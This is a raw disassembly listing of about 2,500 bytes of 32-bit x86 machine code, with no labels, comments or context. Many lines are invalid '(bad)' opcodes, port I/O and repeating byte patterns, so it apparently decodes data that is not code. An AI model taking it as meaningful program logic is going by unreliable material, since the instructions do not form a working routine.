  423bd5:	or     dl,BYTE PTR ds:0x50f9f080
  423bdb:	ja     0x423b61
  423bdd:	xor    BYTE PTR [edi-0x7],0x53
  423be1:	adc    DWORD PTR [ebx-0x4],edx
  423be4:	mov    dl,0xbe
  423be6:	or     al,0xb2
  423be8:	test   BYTE PTR [ecx],ch
  423bea:	(bad)  
  423beb:	std    
  423bec:	xor    BYTE PTR [edi+0x66],0x63
  423bf0:	std    
  423bf1:	or     DWORD PTR [edi],ecx
  423bf3:	cmp    eax,0x808d8d2f
  423bf8:	lock stc 
  423bfa:	adc    BYTE PTR [edi+0x531153f9],0x7e
  423c01:	mov    dl,0xbe
  423c03:	or     al,0xb2
  423c05:	clc    
  423c06:	sub    edi,edi
  423c08:	(bad)  
  423c09:	arpl   ax,si
  423c0b:	test   BYTE PTR [ecx],cl
  423c0d:	bswap  edi
  423c0f:	das    
  423c10:	lea    ecx,[ebp-0x7fd90f80]
  423c16:	lock es mov dl,0xbe
  423c1a:	or     al,0xcd
  423c1c:	add    eax,0x80ef10c4
  423c21:	lock stc 
  423c23:	xor    al,0xf9
  423c26:	mov    dl,0xbe
  423c28:	or     al,0xcd
  423c2a:	add    eax,0x3a7d10c4
  423c2f:	xor    al,0x36
  423c32:	xor    al,0x36
  423c35:	mov    dl,0xbe
  423c37:	or     al,0xcd
  423c39:	add    eax,0xc7d10c4
  423c3e:	in     eax,dx
  423c3f:	cmp    BYTE PTR ds:0x8d4d4d4d,bl
  423c45:	in     eax,dx
  423c46:	cmp    BYTE PTR ds:0x8d4d4d4d,ah
  423c4c:	add    DWORD PTR [ecx],eax
  423c4e:	and    eax,0x964d4d4d
  423c53:	dec    ebp
  423c54:	xlat   BYTE PTR ds:[ebx]
  423c55:	add    DWORD PTR ds:[ecx],eax
  423c58:	sbb    eax,0x4d4d4d4d
  423c5d:	xlat   BYTE PTR ds:[ebx]
  423c5e:	test   BYTE PTR [esi+0x4daff080],dl
  423c64:	sahf   
  423c65:	and    DWORD PTR [eax-0x4d128910],eax
  423c6b:	jno    0x423c03
  423c6d:	or     al,BYTE PTR [esi+0x4d4d8832]
  423c73:	push   eax
  423c74:	ja     0x423cd8
  423c76:	xor    BYTE PTR [edi-0x11],0x80
  423c7a:	lock adc BYTE PTR cs:[edi+0x32cd802e],0x3a
  423c83:	lea    ecx,[ebp+0x7e531153]
  423c89:	mov    dl,0xbe
  423c8b:	or     al,0xb2
  423c8d:	clc    
  423c8e:	sub    edi,edi
  423c90:	(bad)  
  423c91:	xchg   esi,eax
  423c92:	xor    al,0xf9
  423c95:	adc    BYTE PTR [edi+0x531153f9],0x7e
  423c9c:	mov    dl,0xbe
  423c9e:	or     al,0xb2
  423ca0:	clc    
  423ca1:	sub    edi,edi
  423ca3:	(bad)  
  423ca4:	xchg   esi,eax
  423ca5:	dec    ebp
  423ca6:	xlat   BYTE PTR ds:[ebx]
  423ca7:	dec    bp
  423ca9:	or     bl,BYTE PTR ds:0xb2627780
  423caf:	push   0xc
  423cb1:	push   ebx
  423cb2:	jl     0x423d17
  423cb4:	jl     0x423c36
  423cb6:	ja     0x423ca7
  423cb8:	xor    al,0x2e
  423cbb:	or     ch,0x32
  423cbe:	cmp    cl,BYTE PTR [ebp+0x2e97808d]
  423cc4:	xlat   BYTE PTR ds:[ebx]
  423cc5:	push   ebp
  423cc6:	push   ebx
  423cc7:	adc    DWORD PTR [ebx+0x7e],edx
  423cca:	mov    dl,0xbe
  423ccc:	or     al,0xb2
  423cce:	clc    
  423ccf:	sub    edi,edi
  423cd1:	(bad)  
  423cd2:	xchg   esi,eax
  423cd3:	xor    al,0xf9
  423cd6:	adc    BYTE PTR [edi+0x531153f9],0x7e
  423cdd:	mov    dl,0xbe
  423cdf:	or     al,0xb2
  423ce1:	clc    
  423ce2:	sub    edi,edi
  423ce4:	(bad)  
  423ce5:	xchg   esi,eax
  423ce6:	dec    ebp
  423ce7:	xlat   BYTE PTR ds:[ebx]
  423ce8:	jbe    0x423d37
  423cea:	or     bl,BYTE PTR ds:0x50847780
  423cf0:	ja     0x423d68
  423cf2:	xor    BYTE PTR [edi+0x3e],0x50
  423cf6:	ja     0x423c82
  423cf8:	les    edi,FWORD PTR [ecx]
  423cfa:	push   ebx
  423cfb:	adc    DWORD PTR [ebx+0x7e],edx
  423cfe:	mov    dl,0xbe
  423d00:	or     al,0xb2
  423d02:	clc    
  423d03:	sub    edi,edi
  423d05:	(bad)  
  423d06:	xchg   esi,eax
  423d07:	xor    al,0xf9
  423d0a:	adc    BYTE PTR [edi+0x531153f9],0x7e
  423d11:	mov    dl,0xbe
  423d13:	or     al,0xb2
  423d15:	clc    
  423d16:	sub    edi,edi
  423d18:	(bad)  
  423d19:	xchg   esi,eax
  423d1a:	dec    ebp
  423d1b:	xlat   BYTE PTR ds:[ebx]
  423d1c:	test   BYTE PTR [ebp+0xa],cl
  423d1f:	sbb    eax,0x508a7780
  423d24:	ja     0x423d44
  423d26:	xor    BYTE PTR [edi+0x76],0x50
  423d2a:	out    0x56,eax
  423d2c:	push   eax
  423d2d:	ja     0x423d91
  423d2f:	jl     0x423da8
  423d31:	xor    ch,0x24
  423d34:	outs   dx,DWORD PTR ds:[esi]
  423d35:	cmp    BYTE PTR [eax-0xf7fa989],al
  423d3b:	push   esi
  423d3c:	push   ebx
  423d3d:	cld    
  423d3e:	push   ebx
  423d3f:	adc    DWORD PTR [edx-0x414dd67c],esi
  423d45:	or     al,0xff
  423d47:	mov    dl,0x50
  423d49:	ja     0x423d91
  423d4b:	xor    BYTE PTR [edi+0x56],0x80
  423d4f:	lock push esi
  423d51:	push   ebx
  423d52:	cld    
  423d53:	push   ebx
  423d54:	adc    DWORD PTR [edx-0x414dd67c],esi
  423d5a:	or     al,0xff
  423d5c:	mov    dl,0x50
  423d5e:	ja     0x423d0f
  423d60:	jl     0x423dd9
  423d62:	jp     0x423dad
  423d64:	and    al,0x6f
  423d66:	cmp    BYTE PTR [edi+esi*2-0x7c],bh
  423d6a:	fisub  WORD PTR [edi+ebp*2]
  423d6d:	cmp    BYTE PTR [eax-0xf7fa989],al
  423d73:	push   esi
  423d74:	push   ebx
  423d75:	cld    
  423d76:	push   ebx
  423d77:	adc    DWORD PTR [edx-0x7b4df342],esi
  423d7d:	sub    edi,edi
  423d7f:	mov    dl,0x80
  423d81:	lock push ds
  423d83:	arpl   bp,di
  423d85:	or     DWORD PTR [edi],ecx
  423d87:	pop    ss
  423d88:	in     al,dx
  423d89:	lea    ecx,[ebp-0x72f35f42]
  423d8f:	lea    eax,[eax+0x77807af0]
  423d95:	jp     0x423d17
  423d97:	xchg   edi,eax
  423d98:	inc    esi
  423d99:	push   ebx
  423d9a:	je     0x423def
  423d9c:	push   ecx
  423d9d:	mov    dl,0x86
  423d9f:	or     al,0xb2
  423da1:	mov    edx,0x80fdff29
  423da6:	ja     0x423dc6
  423da8:	inc    ebx
  423da9:	sti    
  423daa:	push   ebx
  423dab:	jb     0x423df8
  423dad:	add    eax,0x80af7750
  423db2:	ja     0x423d38
  423db4:	xor    al,0x84
  423db7:	push   ebx
  423db8:	cld    
  423db9:	push   ebx
  423dba:	adc    DWORD PTR [edx-0x7b4df342],esi
  423dc0:	sub    edi,edi
  423dc2:	mov    dl,0x80
  423dc4:	lock scas eax,DWORD PTR es:[edi]
  423dc6:	arpl   bp,di
  423dc8:	fst    DWORD PTR [edi]
  423dca:	xor    BYTE PTR [edi-0x7c],0x80
  423dce:	lock test BYTE PTR [ebx-0x4],dl
  423dd2:	push   ebx
  423dd3:	adc    DWORD PTR [edx-0x414dd67c],esi
  423dd9:	or     al,0xff
  423ddb:	mov    dl,0x50
  423ddd:	ja     0x423d8e
  423ddf:	xor    BYTE PTR [edi+0x7a],0x80
  423de3:	lock jp 0x423e39
  423de6:	cld    
  423de7:	push   ebx
  423de8:	adc    DWORD PTR [edx-0x414dd67c],esi
  423dee:	or     al,0xff
  423df0:	mov    dl,0x80
  423df2:	lock scas eax,DWORD PTR es:[edi]
  423df4:	or     DWORD PTR [edx],esp
  423df6:	mov    dl,0x50
  423df8:	ja     0x423da9
  423dfa:	xor    BYTE PTR [edi+0x56],0x80
  423dfe:	lock push esi
  423e00:	push   ebx
  423e01:	cld    
  423e02:	push   ebx
  423e03:	adc    DWORD PTR [edx-0x7b4df342],esi
  423e09:	sub    edi,edi
  423e0b:	mov    dl,0x80
  423e0d:	lock scas eax,DWORD PTR es:[edi]
  423e0f:	arpl   bp,di
  423e11:	or     DWORD PTR [edi],ecx
  423e13:	(bad)  
  423e14:	or     al,0x8d
  423e16:	lea    eax,[eax+0x7750af77]
  423e1c:	scas   eax,DWORD PTR es:[edi]
  423e1d:	xor    BYTE PTR [edi+0x46],0xec
  423e21:	ja     0x423e85
  423e23:	push   eax
  423e24:	out    0x3e,eax
  423e26:	push   eax
  423e27:	ja     0x423e87
  423e29:	pop    esi
  423e2a:	cmc    
  423e2b:	and    al,0x6f
  423e2d:	cmp    BYTE PTR [eax+0x77],dl
  423e30:	push   0x7c
  423e32:	ja     0x423e9a
  423e34:	hlt    
  423e35:	and    al,0x6f
  423e37:	cmp    BYTE PTR [edi+esi*2+0x26],bh
  423e3b:	repz and al,0x6f
  423e3e:	cmp    BYTE PTR [eax+0x77],dl
  423e41:	test   DWORD PTR [eax-0xf7fc189],0x53fc533e
  423e4b:	adc    DWORD PTR [edx-0x414dd67c],esi
  423e51:	or     al,0xff
  423e53:	mov    dl,0x50
  423e55:	ja     0x423e54
  423e57:	sub    BYTE PTR [edx-0x42],0x4f
  423e5b:	cmp    cl,BYTE PTR [ebp+0x7c6a808d]
  423e61:	dec    edi
  423e62:	xor    DWORD PTR [ebp+0x4d],ecx
  423e65:	dec    ebp
  423e66:	jmp    0x7c6a:0x80386f24
  423e6d:	dec    edi
  423e6e:	jge    0x423ebd
  423e70:	dec    ebp
  423e71:	dec    ebp
  423e72:	or     esp,DWORD PTR [edi+ebp*2]
  423e75:	cmp    BYTE PTR [eax-0x7f957f96],al
  423e7b:	ja     0x423e74
  423e7d:	xor    al,0xf7
  423e80:	push   ebx
  423e81:	cld    
  423e82:	push   ebx
  423e83:	adc    DWORD PTR [edx-0x414dd67c],esi
  423e89:	or     al,0xff
  423e8b:	mov    dl,0x80
  423e8d:	lock std 
  423e8f:	or     DWORD PTR [edx],esp
  423e91:	mov    dl,0x80
  423e93:	lock pop esi
  423e95:	(bad)  
  423e96:	out    dx,al
  423e97:	out    dx,eax
  423e98:	adc    BYTE PTR [edi-0x54],dh
  423e9b:	sub    BYTE PTR [edx-0x80],0x77
  423e9f:	test   DWORD PTR [eax+0x1153f7f0],0xbeb2fc53
  423ea9:	or     al,0xb2
  423eab:	test   BYTE PTR [ecx],ch
  423ead:	push   DWORD PTR [edx+0x9fdf080]
  423eb3:	and    dh,BYTE PTR [edx-0x7f990f80]
  423eb9:	xchg   edi,eax
  423eba:	push   bx
  423ebc:	push   ecx
  423ebd:	push   ebx
  423ebe:	xchg   esp,eax
  423ebf:	mov    dl,0xba
  423ec1:	sub    DWORD PTR [edx-0x100f3f9],esi
  423ec7:	in     al,dx
  423ec8:	mov    dl,0x80
  423eca:	lock pop esi
  423ecc:	or     eax,esp
  423ece:	and    edi,ebp
  423ed0:	or     BYTE PTR [edi+0x31],0x4d
  423ed4:	dec    ebp
  423ed5:	dec    ebp
  423ed6:	sbb    BYTE PTR [eax],0x31
  423ed9:	dec    ebp
  423eda:	dec    ebp
  423edb:	dec    ebp
  423edc:	push   ebx
  423edd:	cld    
  423ede:	push   ebx
  423edf:	xchg   esp,eax
  423ee0:	mov    dl,0x84
  423ee2:	sub    DWORD PTR [edx-0x400f3f9],esi
  423ee8:	in     al,dx
  423ee9:	mov    dl,0x9
  423eeb:	loopne 0x423edd
  423eed:	lods   al,BYTE PTR ds:[esi]
  423eee:	push   ebx
  423eef:	std    
  423ef0:	adc    al,dh
  423ef2:	lods   al,BYTE PTR ds:[esi]
  423ef3:	sub    BYTE PTR [edx-0x71],0x77
  423ef7:	lods   al,BYTE PTR ds:[esi]
  423ef8:	xor    al,0xf7
  423efb:	adc    BYTE PTR [edi+0x535153f7],0x94
  423f02:	mov    dl,0x7
  423f04:	or     al,0xb2
  423f06:	mov    edx,0x80feff29
  423f0b:	xchg   edi,eax
  423f0c:	std    
  423f0d:	or     DWORD PTR [edx],esp
  423f0f:	inc    BYTE PTR [eax-0x11efa169]
  423f15:	push   cs
  423f16:	sub    BYTE PTR [edx-0x80],0x77
  423f1a:	test   DWORD PTR [eax-0x3ac0810],0x84b21153
  423f24:	sub    DWORD PTR [edx-0x4d00f342],esi
  423f2a:	xor    al,0xfd
  423f2d:	or     DWORD PTR [edx],esp
  423f2f:	mov    dl,0x80
  423f31:	lock pop esi
  423f33:	(bad)  
  423f34:	out    dx,al
  423f35:	out    dx,eax
  423f36:	adc    BYTE PTR [edi-0x54],dh
  423f39:	sub    BYTE PTR [edx-0x80],0x77
  423f3d:	test   DWORD PTR [eax-0x3ac0810],0x532984b2
  423f47:	adc    DWORD PTR [edx-0x4d00f342],esi
  423f4d:	xor    al,0xfd
  423f50:	or     DWORD PTR [edx],esp
  423f52:	mov    dl,0x80
  423f54:	lock push 0xffffff80
  423f57:	xchg   edi,eax
  423f58:	push   0x53
  423f5a:	push   ecx
  423f5b:	push   ebx
  423f5c:	xchg   esp,eax
  423f5d:	mov    dl,0xba
  423f5f:	sub    DWORD PTR [edx-0x100f3f9],esi
  423f65:	in     al,dx
  423f66:	mov    dl,0x80
  423f68:	lock pop esi
  423f6a:	or     eax,esp
  423f6c:	and    edi,ebp
  423f6e:	or     BYTE PTR [edi+0x7d],0x4d
  423f72:	dec    ebp
  423f73:	dec    ebp
  423f74:	sbb    BYTE PTR [eax],0x7d
  423f77:	dec    ebp
  423f78:	dec    ebp
  423f79:	dec    ebp
  423f7a:	push   ebx
  423f7b:	cld    
  423f7c:	push   ebx
  423f7d:	xchg   esp,eax
  423f7e:	mov    dl,0x84
  423f80:	sub    DWORD PTR [edx-0x400f3f9],esi
  423f86:	in     al,dx
  423f87:	mov    dl,0x9
  423f89:	loopne 0x423f7b
  423f8b:	lods   al,BYTE PTR ds:[esi]
  423f8c:	push   ebx
  423f8d:	std    
  423f8e:	adc    al,dh
  423f90:	lods   al,BYTE PTR ds:[esi]
  423f91:	sub    BYTE PTR [edx-0x71],0x77
  423f95:	lods   al,BYTE PTR ds:[esi]
  423f96:	xor    al,0xf7
  423f99:	adc    BYTE PTR [edi+0x535153f7],0x94
  423fa0:	mov    dl,0x7
  423fa2:	or     al,0xb2
  423fa4:	mov    edx,0x80feff29
  423fa9:	xchg   edi,eax
  423faa:	std    
  423fab:	or     DWORD PTR [edx],esp
  423fad:	inc    BYTE PTR [eax-0x11efa169]
  423fb3:	push   cs
  423fb4:	sub    BYTE PTR [edx-0x80],0x77
  423fb8:	es xor al,0x26
  423fbc:	push   ebx
  423fbd:	adc    DWORD PTR [ebx-0x4],edx
  423fc0:	mov    dl,0xbe
  423fc2:	or     al,0xb2
  423fc4:	test   BYTE PTR [ecx],ch
  423fc6:	push   DWORD PTR [edx-0x7f950f80]
  423fcc:	xchg   edi,eax
  423fcd:	push   0x53
  423fcf:	push   ecx
  423fd0:	push   ebx
  423fd1:	xchg   esp,eax
  423fd2:	mov    dl,0xba
  423fd4:	sub    DWORD PTR [edx-0x100f3f9],esi
  423fda:	or     DWORD PTR [edx],esp
  423fdc:	mov    dl,0xec
  423fde:	ja     0x423fdd
  423fe0:	push   eax
  423fe1:	ja     0x423fe0
  423fe3:	xor    BYTE PTR [edi-0x3],0x80
  423fe7:	lock scas eax,DWORD PTR es:[edi]
  423fe9:	arpl   bp,di
  423feb:	or     edx,ebp
  423fed:	(bad)  
  423fee:	or     eax,0x77804d4d
  423ff3:	push   0xffffff80
  423ff5:	lock push 0x53
  423ff8:	adc    DWORD PTR [edx-0x3acf342],esi
  423ffe:	mov    dl,0x84
  424000:	sub    edi,edi
  424002:	mov    dl,0x80
  424004:	lock scas eax,DWORD PTR es:[edi]
  424006:	or     DWORD PTR [edx],esp
  424008:	mov    dl,0x80
  42400a:	lock ds push ebx
  42400d:	push   ecx
  42400e:	mov    dl,0xba
  424010:	sub    edi,edi
  424012:	mov    dl,0x80
  424014:	lock ds push ebx
  424017:	adc    DWORD PTR [edx-0x4d00f342],esi
  42401d:	push   eax
  42401e:	ja     0x424086
  424020:	xor    BYTE PTR [edi-0x7e],0x80
  424024:	lock adc BYTE PTR [ebx+0x11],0xb2
  424029:	mov    esi,0xb2fc530c
  42402e:	test   BYTE PTR [ecx],ch
  424030:	push   DWORD PTR [edx-0x7f7d0f80]
  424036:	xchg   edi,eax
  424037:	adc    BYTE PTR [ebx+0x51],0xb2
  42403b:	mov    edx,0xb2945329
  424040:	pop    es
  424041:	or     al,0xff
  424043:	(bad)  
  424044:	in     al,dx
  424045:	lock data16 in al,dx
  424048:	std    
  424049:	in     al,dx
  42404a:	lock inc esi
  42404c:	push   eax
  42404d:	lock inc esi
  42404f:	les    ebx,FWORD PTR ds:0x80827780
  424055:	lock adc BYTE PTR [ebx-0x4],0x53
  42405a:	adc    DWORD PTR [edx-0x414dd67c],esi
  424060:	or     al,0xff
  424062:	mov    dl,0xec
  424064:	ja     0x4240ac
  424066:	push   eax
  424067:	ja     0x4240af
  424069:	xor    BYTE PTR [edi-0x7e],0x80
  42406d:	lock adc BYTE PTR [ebx-0x4],0xb2
  424072:	test   BYTE PTR [ecx],ch
  424074:	push   ebx
  424075:	adc    DWORD PTR [edx-0x4d00f342],esi
  42407b:	xor    al,0x1e
  42407e:	inc    ebx
  42407f:	std    
  424080:	xor    BYTE PTR [edi-0x7e],0x80
  424084:	xchg   edi,eax
  424085:	adc    BYTE PTR [ebx-0x4],0x53
  424089:	xchg   esp,eax
  42408a:	mov    dl,0x7
  42408c:	or     al,0xb2
  42408e:	test   BYTE PTR [ecx],ch
  424090:	(bad)  
  424091:	sti    
  424092:	adc    BYTE PTR [edi-0x4ddf6ba],0x63
  424099:	mov    dl,0x9
  42409b:	dec    esp
  42409c:	xor    cl,BYTE PTR [edx+0x77804d4d]
  4240a2:	out    dx,eax
  4240a3:	dec    ebp
  4240a4:	xlat   BYTE PTR ds:[ebx]
  4240a5:	and    DWORD PTR [ecx],eax
  4240a7:	ja     0x42402f
  4240a9:	dec    ebp
  4240aa:	xlat   BYTE PTR ds:[ebx]
  4240ab:	out    dx,eax
  4240ac:	or     al,BYTE PTR [eax-0x327f1089]
  4240b2:	jp     0x4240ee
  4240b4:	lea    ecx,[ebp+0x7780814d]
  4240ba:	out    dx,eax
  4240bb:	or     ch,0xf7
  4240be:	cmp    cl,BYTE PTR [ebp+0x4d814d8d]
  4240c4:	xlat   BYTE PTR ds:[ebx]
  4240c5:	mov    cl,BYTE PTR [ebp-0x29]
  4240c8:	jbe    0x424050
  4240ca:	test   eax,0x508d8def
  4240cf:	ja     0x424133
  4240d1:	xor    BYTE PTR [edi-0x75],0x80
  4240d5:	lock mov edx,DWORD PTR [ebx+0x74]
  4240d9:	push   ebx
  4240da:	push   ecx
  4240db:	mov    dl,0xba
  4240dd:	sub    DWORD PTR [edx-0x4d00f37a],esi
  4240e3:	xor    al,0x76
  4240e6:	arpl   WORD PTR [edx+0x778057d5],si
  4240ec:	out    dx,eax
  4240ed:	xor    al,0x2e
  4240f0:	adc    BYTE PTR [edi+0x32cd802e],0x3a
  4240f7:	lea    ecx,[ebp+0x7e531153]
  4240fd:	mov    dl,0xbe
  4240ff:	or     al,0xb2
  424101:	clc    
  424102:	sub    edi,edi
  424104:	(bad)  
  424105:	xchg   esi,eax
  424106:	xor    al,0x8b
  424109:	adc    BYTE PTR [edi+0x5311538b],0x7e
  424110:	mov    dl,0xbe
  424112:	or     al,0xb2
  424114:	clc    
  424115:	sub    edi,edi
  424117:	(bad)  
  424118:	xchg   esi,eax
  424119:	dec    ebp
  42411a:	xlat   BYTE PTR ds:[ebx]
  42411b:	jbe    0x42416a
  42411d:	or     bl,BYTE PTR ds:0x70a3a9ab
  424123:	sti    
  424124:	out    dx,eax
  424125:	lea    edx,[edi-0x78127880]
  42412b:	and    eax,0x80328099
  424130:	mov    ds:0x8d8d3a2e,al
  424135:	in     eax,dx
  424136:	pop    ebp
  424137:	lea    ecx,[ecx]
  424139:	(bad)  
  42413b:	cmp    cl,BYTE PTR [ebp+0x9724f8d]
  424141:	(bad)  
  424143:	cmp    cl,BYTE PTR [ebp+0x90b4f8d]
  424149:	jne    0x80cfcedc
  42414f:	dec    esp
  424150:	adc    BYTE PTR [ebp+0x6a4f8d8d],cl
  424156:	or     DWORD PTR [edi],ecx
  424158:	mov    esp,0xed8d8d8d
  42415d:	cli    
  42415e:	inc    ecx
  42415f:	lea    ecx,[ebp+0xf09718d]
  424165:	add    ecx,DWORD PTR [ebp-0x66a07273]
  42416b:	push   ebp
  42416c:	or     DWORD PTR [edi],ecx
  42416e:	mov    dh,0x8d
  424170:	lea    ecx,[ebp+0x3a268e80]
  424176:	lea    ecx,[ebp-0x72cd4813]
  42417c:	cmp    dh,0x43
  42417f:	mov    eax,ds:0x5c09fbec
  424184:	or     ah,BYTE PTR [ecx]
  424186:	push   eax
  424187:	lock stc 
  424189:	or     DWORD PTR [ebp+edi*2-0x5f],ebx
  42418d:	in     al,dx
  42418e:	dec    BYTE PTR [ecx]
  424190:	psadbw mm1,QWORD PTR [ebp+0x7d018d8d]
  424197:	adc    eax,0x86f05093
  42419c:	cli    
  42419d:	dec    ebp
  42419e:	dec    ebp
  42419f:	dec    ebp
  4241a0:	jmp    0x42413d
  4241a2:	dec    edi
  4241a3:	outs   dx,BYTE PTR ds:[esi]
  4241a4:	aad    0xeb
  4241a6:	or     BYTE PTR [esi],0xed
  4241a9:	mov    bh,0xc8
  4241ab:	lea    esi,[ebx]
  4241ad:	jle    0x42419b
  4241af:	test   DWORD PTR [ecx],0x9a1e65c
  4241b5:	pop    esp
  4241b6:	scas   al,BYTE PTR es:[edi]
  4241b7:	and    esp,ebp
  4241b9:	push   es
  4241ba:	aad    0xbf
  4241bc:	add    edx,ebx
  4241be:	adc    eax,0x4f87f050
  4241c3:	outs   dx,BYTE PTR ds:[esi]
  4241c4:	aad    0x92
  4241c6:	xor    BYTE PTR [eax],0xed
  4241c9:	mov    bh,0x8b
  4241cb:	lea    esi,[ebx]
  4241cd:	push   ecx
  4241ce:	in     al,dx
  4241cf:	std    
  4241d0:	or     DWORD PTR [edi+ebx*8-0x5f],ebx
  4241d4:	or     DWORD PTR [edi+ebx*4+0x21],ebx
  4241d8:	in     al,dx
  4241d9:	push   es
  4241da:	aad    0x43
  4241dc:	add    edi,ebx
  4241de:	adc    eax,0x808ae750
  4241e3:	out    0x8a,eax
  4241e5:	sub    BYTE PTR [ebx+0x4f],0x4d
  4241e9:	aad    0x6f
  4241eb:	and    BYTE PTR [edi-0x73dac507],0x9
  4241f2:	pop    esp
  4241f3:	fbld   TBYTE PTR [ecx+0x219f5c09]
  4241f9:	dec    ebp
  4241fa:	ja     0x424187
  4241fc:	in     eax,dx
  4241fd:	ja     0x424189
  4241ff:	out    dx,eax
  424200:	in     al,dx
  424201:	push   es
  424202:	pop    edi
  424203:	out    0x8b,eax
  424205:	in     al,0xa4
  424207:	or     DWORD PTR [esi+eiz*8-0x5f],ebx
  42420b:	or     DWORD PTR [esi+ebp*4+0x21],ebx
  42420f:	xor    al,0x87
  424212:	dec    ebp
  424213:	ja     0x4241dd
  424215:	in     eax,dx
  424216:	mov    dl,0xef
  424218:	in     al,dx
  424219:	push   es
  42421a:	push   eax
  42421b:	lock xchg DWORD PTR [edi-0x19],ebx
  42421f:	enter  0x2ee4,0x80
  424223:	lock xchg BYTE PTR [ecx],cl
  424226:	pop    esp
  424227:	or     ah,BYTE PTR [ecx+0x21dd5c09]
  42422d:	dec    ebp
  42422e:	ja     0x424262
  424230:	in     eax,dx
  424231:	mov    dl,0xef
  424233:	in     al,dx
  424234:	pushf  
  424235:	push   eax
  424236:	lock xchg BYTE PTR [edi-0x69],bl
  42423a:	xor    cl,BYTE PTR [ecx]
  42423c:	jmp    0xa3ab:0x4d4d4d9a
  424243:	push   ebx
  424244:	push   0x6d
  424246:	les    ecx,FWORD PTR [ebx+edx*2]
  424249:	push   0xffffffa9
  42424b:	jo     0x4242c1
  42424d:	xchg   edi,eax
  42424e:	add    BYTE PTR [edi+0x3a2e5080],0x8d
  424255:	lea    eax,[eax-0x7812de89]
  42425b:	jno    0x4241f0
  42425d:	push   ebx
  42425e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42425f:	cdq    
  424260:	fwait
  424261:	pop    edi
  424262:	pop    ds
  424263:	or     DWORD PTR [edi],ecx
  424265:	jmp    0xd574:0x638d8d8d
  42426c:	call   0xd81fdfd0
  424271:	das    
  424272:	push   ebx
  424273:	push   0x6d
  424275:	(bad)  
  424276:	fld    DWORD PTR [eax+0x77ecdd6d]
  42427c:	out    dx,eax
  42427d:	cmp    BYTE PTR [ebp+0x25],0x80
  424281:	or     dh,BYTE PTR ds:0x80155280
  424287:	fstp   QWORD PTR ds:0xeceff0ec
  42428d:	xchg   edi,eax
  42428e:	out    dx,eax
  42428f:	push   eax
  424290:	xlat   BYTE PTR ds:[ebx]
  424291:	mov    ah,BYTE PTR [ebx+0x4b]
  424294:	fucomi st,st(4)
  424296:	push   eax
  424297:	out    0x8a,eax
  424299:	push   eax
  42429a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42429b:	mov    ebx,DWORD PTR [edi-0x59]
  42429e:	mov    bl,cl
  4242a0:	mov    dh,0x63
  4242a2:	popf   
  4242a3:	adc    eax,0x5c096fd3
  4242a8:	push   ebp
  4242a9:	scas   al,BYTE PTR es:[edi]
  4242aa:	les    ecx,FWORD PTR [eax+eax*4]
  4242ad:	mov    BYTE PTR [ecx],0x55
  4242b0:	mov    es,WORD PTR [eax-0x2ab2b097]
  4242b6:	aas    
  4242b7:	in     al,dx
  4242b8:	out    0xef,eax
  4242ba:	push   eax
  4242bb:	out    0x32,eax
  4242bd:	arpl   WORD PTR [ebx-0x587f8e27],cx
  4242c3:	and    DWORD PTR [eax-0x7d131a5d],eax
  4242c9:	arpl   WORD PTR [esi],ax
  4242cb:	shr    esi,cl
  4242cd:	sbb    BYTE PTR [ecx-0x3c],0xef
  4242d1:	inc    ebx
  4242d2:	out    0xef,eax
  4242d4:	push   eax
  4242d5:	imul   eax,DWORD PTR [eax+0xb4f32d7],0xa780a1d5
  4242df:	mov    esi,DWORD PTR [ebx+0x50]
  4242e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4242e3:	mov    esp,DWORD PTR [ebx-0x59]
  4242e6:	mov    ah,ah
  4242e8:	pop    esi
  4242e9:	(bad)  
  4242ea:	into   
  4242eb:	push   ebx
  4242ec:	push   0xffffffab
  4242ee:	test   eax,0xeffb70a3
  4242f3:	lea    edx,[edi-0x78127880]
  4242f9:	adc    DWORD PTR [ebx+0x24f65e99],0x7750386f
  424303:	mov    bh,BYTE PTR [edi+esi*2-0x75]
  424307:	cmc    
  424308:	and    al,0x6f
  42430a:	cmp    BYTE PTR [eax-0x587f7510],al
  424310:	mov    bl,BYTE PTR [ebx+0x52010de2]
  424316:	cmp    dl,BYTE PTR [ebx+0x51]
  424319:	mov    dl,0xbe
  42431b:	or     al,0xab
  42431d:	push   ebx
  42431e:	lods   al,BYTE PTR ds:[esi]
  42431f:	mov    dl,0xb4
  424321:	sub    edi,edi
  424323:	adc    DWORD PTR [eax-0x10],edx
  424326:	xchg   BYTE PTR [eax-0xf7f7510],al
  42432c:	mov    al,BYTE PTR [eax-0xf7f7510]
  424332:	mov    al,BYTE PTR [eax-0xf7f7510]
  424338:	mov    al,BYTE PTR [eax-0xf7f7510]
  42433e:	mov    al,BYTE PTR [eax-0xf7f7510]
  424344:	mov    bh,BYTE PTR [edi+esi*2+0x32]
  424348:	fsincos 
  42434a:	lods   al,BYTE PTR ds:[esi]
  42434b:	pop    eax
  42434c:	xor    al,0x8a
  42434f:	and    BYTE PTR [edi+0x53ac538a],0x51
  424356:	mov    dl,0xb4
  424358:	sub    DWORD PTR [edx+0x11ff0cbe],esi
  42435e:	and    BYTE PTR [edi+0x2e248021],0x3a
  424365:	lea    ecx,[ebp+0xf09ff63]
  42436b:	sbb    ah,ch
  42436d:	lea    ecx,[ebp-0x7f750f80]
  424373:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424374:	mov    dl,BYTE PTR [ebx+0x51]
  424377:	push   ebx
  424378:	lods   al,BYTE PTR ds:[esi]
  424379:	mov    dl,0xbe
  42437b:	or     al,0xb2
  42437d:	mov    ah,0x29
  42437f:	call   DWORD PTR [ecx]
  424381:	arpl   si,di
  424383:	or     DWORD PTR [edi],ecx
  424385:	jecxz  0x424373
  424387:	lea    ecx,[ebp-0x72327080]
  42438d:	lea    ecx,[ebp-0x7f756880]
  424393:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424394:	mov    dl,BYTE PTR [ebx+0x7e]
  424397:	push   ebx
  424398:	lods   al,BYTE PTR ds:[esi]
  424399:	mov    dl,0x7
  42439b:	or     al,0xb2
  42439d:	mov    ah,0x29
  42439f:	call   DWORD PTR [ebx+eiz*2-0x6cf0f602]
  4243a6:	in     al,dx
  4243a7:	lea    ecx,[ebp+0x50eff0ec]
  4243ad:	lock test DWORD PTR [eax-0x7f81ac09],0xb2ac5382
  4243b8:	pop    es
  4243b9:	or     al,0xb2
  4243bb:	mov    ah,0x29
  4243bd:	call   DWORD PTR [eax+edx*2-0x687fcd69]
  4243c4:	xor    ah,BYTE PTR [ebx-0x9]
  4243c7:	aad    0x27
